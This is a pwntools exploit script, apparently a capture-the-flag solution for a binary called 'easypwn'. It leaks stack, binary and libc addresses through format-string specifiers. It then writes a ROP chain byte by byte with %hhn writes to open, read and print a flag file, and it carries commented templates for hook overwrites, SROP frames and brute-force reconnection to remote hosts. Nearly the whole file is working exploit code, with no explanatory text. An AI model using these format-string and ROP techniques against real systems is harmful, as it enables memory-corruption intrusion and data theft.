# -*- coding: utf-8 -*-
from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
# context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./easypwn')
if local:
    p = process('./easypwn')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)
#more onegadget
#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6
one64 = [0x45226,0x4527a,0xf0364,0xf1207]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6) 
# one32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]

# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))


sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def ms(name,addr):
    print name + "---->" + hex(addr)

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))


def back_main():
	ru("name?")
	py = ''
	py += "%58c"+"%10$hhn"
	py = py.ljust(0x10,'a')
	py += p64(stack_base-0x18)
	# debug(0x000000000000C6E)
	sl(py)
	ru("how old are you??")
	sl("10")
def change(addr,value):
	if value == 0:
		value = 0x100
	ru("name?")
	py = ''
	py += "%"+str(value)+"c%10$hhn"
	py = py.ljust(0x10,'a')
	py += p64(addr)
	# debug(0x000000000000C6E)
	sl(py)
	ru("how old are you??")
	sl(str(0x67616c66))
	back_main()

def write(target,vaule):
    for i in range(8):
        change(target + i,(vaule >> 8*i) & 0xff)


ru("name?")
py = ''
py += "aa%14$pbb%15$pcc%19$p"
# debug(0x000000000000C6E)
sl(py)
ru("aa")
stack_base = int(rc(14),16)
print "stack_base--->" + hex(stack_base)
ru("bb")
addr_base = int(rc(14),16)-0xd4d
print "addr_base--->" + hex(addr_base)
ru("cc")
libc_base = int(rc(14),16)-0x20840
print "libc_base--->" + hex(libc_base)
pop_rdi_ret = 0x0000000000021112 + libc_base
pop_rsi_ret = 0x00000000000202f8 + libc_base
pop_rdx_ret = 0x0000000000001b92 + libc_base
pop_rax_ret = 0x000000000003a738 + libc_base
syscall_ret = 0x00000000000bc3f5 + libc_base
flag_addr = addr_base + 0x202084
ret_main = stack_base + 8
ru("how old are you??")
sl("10")
back_main()
write(ret_main+0x0,pop_rdi_ret)
write(ret_main+0x8,flag_addr)
write(ret_main+0x10,pop_rsi_ret)
write(ret_main+0x18,0)
write(ret_main+0x20,pop_rdx_ret)
write(ret_main+0x28,0)
write(ret_main+0x30,pop_rax_ret)
write(ret_main+0x38,2)
write(ret_main+0x40,syscall_ret)
write(ret_main+0x48,pop_rdi_ret)
write(ret_main+0x50,3)
write(ret_main+0x58,pop_rsi_ret)
write(ret_main+0x60,flag_addr+0x100)
write(ret_main+0x68,pop_rdx_ret)
write(ret_main+0x70,0x80)
write(ret_main+0x78,pop_rax_ret)
write(ret_main+0x80,0)
write(ret_main+0x88,syscall_ret)
write(ret_main+0x90,pop_rdi_ret)
write(ret_main+0x98,1)
write(ret_main+0xa0,pop_rax_ret)
write(ret_main+0xa8,1)
write(ret_main+0xb0,syscall_ret)
ru("name?")
sl("flag\x00\x00\x00\x00")
# debug(0x000000000000C6E)
ru("how old are you??")
sl(str(0x67616c66))
ru("name?")
sl("flag\x00\x00\x00\x00")

ru("how old are you??")
sl(str(0x67616c66))




#libc_base = u64(rc(6).ljust(8,'\x00'))
#print "libc_base--->" + hex(libc_base)
#malloc_hook = libc_base + libc.sym["__malloc_hook"]
#fake_chunk = malloc_hook - 0x23
#onegadget = libc_base + one64[2]
#realloc = libc_base + libc.sym["realloc"]
#free_hook = libc_base + libc.sym["__free_hook"]
#system = libc_base + libc.sym["system"]
#binsh = libc_base + libc.search("/bin/sh").next()
#setcontext = libc_base + libc.sym["setcontext"]

#pop_rdi_ret = 0x0000000000400ea3
#pop_rdx_rsi_ret = 0x0000000000115189+libc_base
#syscall = 0x00000000000bc3f5 + libc_base
#pop_rax_ret = 0x000000000003a738+libc_base
#leave_ret = 0x0000000000400b8c

#frame = SigreturnFrame()#read(0,free_hook,0x1000) syscall
#frame.rdi = 0
#frame.rsi = bss#rdi+0x70
#frame.rdx = 0x1000#rdi+0x50
#frame.rsp = bss#ret
#frame.rip = syscall_ret#rsp->rip
#a = len(str(frame))
#print "length--->" + hex(a)
#edit(0,str(frame))


#def orw_pay(flag_addr,addr):
#     py += p64(pop_rdi_ret)
#     py += p64(flag_addr)
#     py += p64(pop_rdx_rsi_ret)
#     py += p64(0)
#     py += p64(0)
#     py += p64(pop_rax_ret)
#     py += p64(2)
#     py += p64(syscall)
#     py += p64(pop_rdi_ret)
#     py += p64(3)
#     py += p64(pop_rdx_rsi_ret)
#     py += p64(0x80)
#     py += p64(addr)
#     py += p64(pop_rax_ret)
#     py += p64(0)
#     py += p64(syscall)
#     py += p64(pop_rdi_ret)
#     py += p64(1)
#     py += p64(pop_rax_ret)
#     py += p64(1)
#     py += p64(syscall)
#     py += "./flag\x00\x00"



# i = 0
# while 1:
#     print i
#     i += 1
#     try:
#         pwn()
#     except EOFError:
#         p.close()
#         local = 1
#         elf = ELF('./note_five')
#         if local:
#             p = process('./note_five')
#             libc = elf.libc
#             continue
#         else:
#             p = remote('121.40.246.48',9999)
#             libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#     else:
#         sl("ls")
#         break
p.interactive()